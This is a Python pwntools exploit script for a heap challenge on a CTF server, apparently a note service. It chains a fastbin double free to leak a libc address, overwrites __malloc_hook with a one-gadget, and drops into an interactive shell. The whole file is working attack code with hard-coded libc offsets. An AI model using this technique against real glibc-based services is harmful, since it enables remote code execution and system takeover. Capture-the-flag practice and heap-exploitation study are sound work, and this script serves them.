#! /usr/bin/env python
from pwn import *


def new(size, content):
    io.sendafter("choice> ", "1")
    io.sendafter("size:", str(size))
    io.sendafter("content:", content)

def print_note(index):
    io.sendafter("choice> ", "2")
    io.sendafter("index:", str(index))
    return io.recvline()

def delete_note(index):
    io.sendafter("choice> ", "3")
    io.sendafter("index:", str(index))

io = remote("csie.ctf.tw", 10133)

# libc
leak_offset = 0x3c38e0
onegadget_offset = 0xef6c4
malloc_hook_offset = 0x3c3b10


# 2 fast bin allows us to make a loop
new(0x68, '123')
new(0x68, '123')

# create loop
delete_note(0)
delete_note(1)
delete_note(0)

# change fd
leak_addr = 0x602020 + 5 - 0x8 
new(0x68, p64(leak_addr)) # 2, change index_0's fd
new(0x68, '123')    # 3
new(0x68, '123')    # 4
new(0x68, 'AAA')    # 5, 3 types input exactly overwrite all \x00 between the info we want to leak
leak_libc = u64((print_note(5).strip())[-6:].ljust(8, '\x00'))
print "leak_libc = " + hex(leak_libc)

# calculate libc base and one-gadget
libc_base = leak_libc - leak_offset
print "libc_base = " + hex(libc_base)
one_gadget = libc_base + onegadget_offset

# overwrite __malloc_hook with one_gadget
__malloc_hook = libc_base + malloc_hook_offset - 0x30 + 0xd

delete_note(0)
delete_note(1)
delete_note(0)

new(0x68, p64(__malloc_hook)) # 6, change index_0's fd
new(0x68, '123')    # 7
new(0x68, '123')    # 8
new(0x68, '\x00'*(3*8 - (8-3)) + p64(one_gadget))    # 9 
raw_input("@")

# trigger malloc with double free
#new(0x68, '123')
delete_note(0)
delete_note(0)

io.interactive()
